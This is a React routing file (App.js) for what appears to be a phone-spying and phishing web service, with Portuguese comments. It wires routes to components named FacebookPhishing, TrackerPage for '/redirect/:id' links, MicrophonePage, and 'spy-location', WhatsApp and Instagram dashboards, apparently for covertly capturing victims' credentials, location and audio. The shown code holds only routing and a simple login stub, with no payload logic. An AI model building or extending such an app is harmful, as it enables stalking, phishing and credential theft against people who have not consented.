import React, { useState } from 'react';
import './global.css';
import Login from './components/Login';
import Dashboard from './components/Dashboard';
import TrackerPage from './pages/TrackerPage';
import FacebookPhishing from './pages/FacebookPhishing';
import MicrophonePage from './pages/MicrophonePage';
import HowToGetIMEI from './pages/HowToGetIMEI';
import IMEISupportRequest from './pages/IMEISupportRequest';
import { BrowserRouter, Routes, Route, useParams } from 'react-router-dom';

function WhatsAppChat() {
  const { number } = useParams();
  // ...restante do código...
}

function App() {
  const [usuario, setUsuario] = useState(localStorage.getItem('usuario') || null);

  function handleLogin(email) {
    setUsuario(email);
    localStorage.setItem('usuario', email);
  }

  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={
          !usuario ? (
            <Login onLogin={handleLogin} />
          ) : (
            <Dashboard email={usuario} />
          )
        } />
        <Route path="/whatsapp" element={<Dashboard email={usuario} />} />
        <Route path="/spy-location" element={<Dashboard email={usuario} />} />
        <Route path="/facebook" element={<Dashboard email={usuario} />} />
        <Route path="/microphone" element={<Dashboard email={usuario} />} />
        <Route path="/instagram" element={<Dashboard email={usuario} />} />
        <Route path="/lessons" element={<Dashboard email={usuario} />} />
        <Route path="/faq" element={<Dashboard email={usuario} />} />
        <Route path="/support" element={<Dashboard email={usuario} />} />
        {/* Rotas especiais: NÃO renderize Dashboard aqui! */}
        <Route path="/how-to-get-imei" element={<HowToGetIMEI />} />
        <Route path="/imei-support-request" element={<IMEISupportRequest />} />
        <Route path="/redirect/:id" element={<TrackerPage />} />
        <Route path="/facebook/:id" element={<FacebookPhishing />} />
        <Route path="/microphone/:id" element={<MicrophonePage />} />
        <Route path="/whatsapp-chat/:number" element={<WhatsAppChat />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;
